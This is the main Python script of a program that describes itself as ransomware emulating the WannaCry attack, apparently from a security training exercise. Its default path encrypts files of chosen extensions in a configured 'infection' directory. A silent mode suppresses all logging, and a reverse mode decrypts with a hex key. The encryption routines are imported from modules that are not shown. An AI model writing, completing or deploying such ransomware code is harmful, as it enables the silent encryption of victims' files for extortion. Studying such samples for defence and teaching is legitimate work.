"""Ransomware that emulates wannacry attack"""
from src.logger import Stockholmlogger
from src.config import Configlibrary
from src.stockholm import Desencryptation, Encryptation

def main():
    """main function of the program"""
    config = Configlibrary()
    st_logger = Stockholmlogger()
    st_logger.set_log_level(config.get_log_level())

    try:
        args, unknown = config.parser.parse_known_args()
    except SystemExit:
        return

    if unknown:
        st_logger.logger.error('unknown args')
        return
    if args.silent:
        st_logger.set_log_level("NOTSET")
        st_logger.logger.propagate = False
        if args.reverse:
            desinfection = Desencryptation(st_logger, config.get_infection_dir(),
                                            config.get_infection_extensions(),
                                            args.reverse)
            if desinfection.validate_hexadecimal_key():
                desinfection.run()
        elif not args.version:
            infection = Encryptation(st_logger, config.get_infection_dir(),
                                        config.get_infection_extensions(),
                                        config.get_infection_key())
            if infection.validate_hexadecimal_key():
                infection.run()
    elif args.version:
        st_logger.logger.info(config.get_program_version())
    elif args.reverse:
        desinfection = Desencryptation(st_logger, config.get_infection_dir(),
                                        config.get_infection_extensions(),
                                        args.reverse)
        if desinfection.validate_hexadecimal_key():
            desinfection.run()
    else:
        infection = Encryptation(st_logger, config.get_infection_dir(),
                                    config.get_infection_extensions(),
                                    config.get_infection_key())
        if infection.validate_hexadecimal_key():
            infection.run()

if __name__ == "__main__":
    main()
    